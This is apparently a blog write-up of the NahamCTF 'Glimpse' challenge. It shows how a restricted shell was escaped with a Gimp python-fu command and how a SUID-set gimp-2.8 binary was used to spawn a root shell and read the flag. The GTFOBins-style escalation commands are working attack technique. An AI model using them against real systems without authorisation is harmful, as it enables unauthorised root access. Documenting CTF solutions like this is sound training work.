---
title: "NahamCTF: Glimpse"
categories:
  - NahamCTF
tags:
  - NahamCTF
---

*There's not a lot to work with on this server. But there is something...*

*Connect here:*
*ssh -p 50027 user@jh2i.com # password is 'userpass'*

---

For this challenge, we're given a restricted shell that is unable to change directories. Looking around the system, we see that Gimp is installed, meaning we can break out of this restricted shell:

```
gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.system("sh")'
```

Looking around the system with our non-restricted shell doesn't show us much, but if we look for uncommon SUID binaries (courtesy of Linenum.sh), we see that Gimp is installed with a SUID bit set:

```
#search for suid files
allsuid=`find / -perm -4000 -type f 2>/dev/null`
findsuid=`find $allsuid -perm -4000 -type f -exec ls -la {} 2>/dev/null \;`
if [ "$findsuid" ]; then
  echo -e "\e[00;31m[-] SUID files:\e[00m\n$findsuid" 
  echo -e "\n"
fi
...
-rwsr-sr-x 1 root root 6057888 Mar 28  2018 /usr/bin/gimp-2.8
```

Now, using GTFOBins, we can spawn ourselves a root level shell:

```
/usr/bin/gimp-2.8 -idf --batch-interpreter=python-fu-eval -b 'import os; os.execl("/bin/sh", "sh", "-p")'
...
# id
uid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),1000(user)
# cd /root
# ls
flag.txt
# cat flag.txt
flag{just_need_a_glimpse_of_the_flag_please}
```

**flag{just_need_a_glimpse_of_the_flag_please}**
